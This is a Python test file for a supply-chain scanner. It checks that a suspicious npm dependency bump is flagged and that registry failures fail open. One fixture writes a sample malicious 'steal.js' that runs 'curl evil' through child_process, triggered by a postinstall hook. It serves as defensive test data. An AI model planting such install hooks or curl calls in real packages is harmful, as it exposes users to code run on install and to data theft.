"""Tests for caliper.data.supply_chain_scan -- fetch+diff orchestration.

DPS-12 domains:
  Availability / fail-open (LIVENESS): a raising/unavailable source never aborts
    the scan; it yields an informational finding.
  Determinism (INVARIANT): with a fixed fake source, the same diff produces the
    same findings.
"""

from __future__ import annotations

import os
from pathlib import Path

import pytest

os.environ.setdefault("CALIPER_DB_DSN", "postgresql://t:t@localhost/t")

from caliper.core.config import CaliperSettings  # noqa: E402
from caliper.core.supply_chain_models import FetchedPackage  # noqa: E402
from caliper.data.supply_chain_scan import analyze_upgrade, run_supply_chain_diff  # noqa: E402

_NPM_DIFF = (
    "diff --git a/package.json b/package.json\n"
    "--- a/package.json\n+++ b/package.json\n"
    '@@ -1,3 +1,3 @@\n   "dependencies": {\n'
    '-    "evil": "1.0.0"\n+    "evil": "1.0.1"\n   }\n'
)


class _FakeSource:
    """Returns a benign old version and a malicious new version."""

    name = "npm"

    def __init__(self) -> None:
        self.calls: list[tuple[str, str]] = []

    def fetch_version(self, package: str, version: str, dest: Path) -> FetchedPackage:
        self.calls.append((package, version))
        dest.mkdir(parents=True, exist_ok=True)
        if version == "1.0.1":
            (dest / "steal.js").write_text("require('child_process').exec('curl evil')\n")
            return FetchedPackage(
                available=True, root=dest, install_scripts=("postinstall: node steal.js",)
            )
        (dest / "index.js").write_text("module.exports = 1\n")
        return FetchedPackage(available=True, root=dest)


class _RaisingSource:
    name = "npm"

    def fetch_version(self, package: str, version: str, dest: Path) -> FetchedPackage:
        raise RuntimeError("network exploded")


class _UnavailableSource:
    name = "npm"

    def fetch_version(self, package: str, version: str, dest: Path) -> FetchedPackage:
        return FetchedPackage(available=False, error="registry 503")


def _settings() -> CaliperSettings:
    return CaliperSettings()


class TestRunSupplyChainDiff:
    def test_flags_malicious_bump(self) -> None:
        findings = run_supply_chain_diff(_NPM_DIFF, _settings(), sources={"npm": _FakeSource()})
        ids = {f.id for f in findings}
        assert "SC-INSTALL-HOOK" in ids
        assert "SC-RISKY-IMPORT" in ids

    def test_respects_ecosystem_allowlist(self) -> None:
        os.environ["CALIPER_SUPPLY_CHAIN_DIFF_ECOSYSTEMS"] = "pypi"
        try:
            findings = run_supply_chain_diff(
                _NPM_DIFF, CaliperSettings(), sources={"npm": _FakeSource()}
            )
        finally:
            del os.environ["CALIPER_SUPPLY_CHAIN_DIFF_ECOSYSTEMS"]
        assert findings == []

    def test_deterministic(self) -> None:  # Determinism
        a = run_supply_chain_diff(_NPM_DIFF, _settings(), sources={"npm": _FakeSource()})
        b = run_supply_chain_diff(_NPM_DIFF, _settings(), sources={"npm": _FakeSource()})
        assert [(f.id, f.severity) for f in a] == [(f.id, f.severity) for f in b]


class TestAnalyzeUpgradeFailOpen:
    _change = {"package": "evil", "old_version": "1.0.0", "new_version": "1.0.1"}

    def test_raising_source_is_fail_open(self) -> None:  # Availability
        out = analyze_upgrade(self._change, _RaisingSource(), ecosystem="npm")
        assert [f.id for f in out] == ["SC-SOURCE-UNAVAILABLE"]

    def test_unavailable_source_is_fail_open(self) -> None:
        out = analyze_upgrade(self._change, _UnavailableSource(), ecosystem="npm")
        assert [f.id for f in out] == ["SC-SOURCE-UNAVAILABLE"]

    def test_missing_version_skips(self) -> None:
        out = analyze_upgrade(
            {"package": "x", "old_version": None, "new_version": "1.0"},
            _FakeSource(),
            ecosystem="npm",
        )
        assert out == []


if __name__ == "__main__":  # pragma: no cover
    pytest.main([__file__, "-v"])
